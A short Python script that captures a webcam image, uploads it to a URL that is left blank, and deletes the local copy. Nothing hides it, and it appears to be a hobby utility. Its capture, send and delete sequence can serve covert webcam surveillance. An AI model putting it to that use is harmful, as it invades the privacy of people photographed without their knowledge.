from ecapture import ecapture
from postman import post_files
import os

if __name__ == "__main__":
    file_name = "0.png"
    url = "" #change this to desired url
    try:
        ecapture.capture(0, False, file_name)
    except Exception as e:
        print(e)
    else:
        post_files(url, [file_name])
        os.remove(file_name)
